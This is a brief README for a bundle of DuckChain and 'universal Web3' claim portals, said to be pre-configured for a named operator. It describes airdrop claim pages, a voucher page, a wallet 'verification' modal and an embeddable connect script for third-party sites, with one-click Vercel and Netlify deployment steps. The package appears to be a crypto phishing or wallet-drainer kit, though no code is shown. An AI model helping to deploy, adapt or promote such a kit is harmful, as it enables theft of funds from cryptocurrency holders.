# DuckChain & Universal Web3 Claim Portal Bundle

Pre-configured for Operator: **Mayankahuja100**

## Included Portals
- `index.html`: Classic DuckChain Claim Portal
- `send.html`: Dedicated Full-Page Allocation Voucher
- `connect.html`: Universal Minimalist Web3 Verification Widget & Modal
- `assets/widget.js`: 1-line Embeddable Web3 Connect SDK for third-party sites

## Deploy to Vercel (1-Click)
1. Extract this zip file
2. Install Vercel CLI: `npm i -g vercel`
3. Run: `vercel --prod`
All environment variables and claim endpoints are pre-configured.

## Deploy to Netlify / Cloudflare Pages / Static Hosting
Upload the unzipped directory to your hosting provider's public docroot.
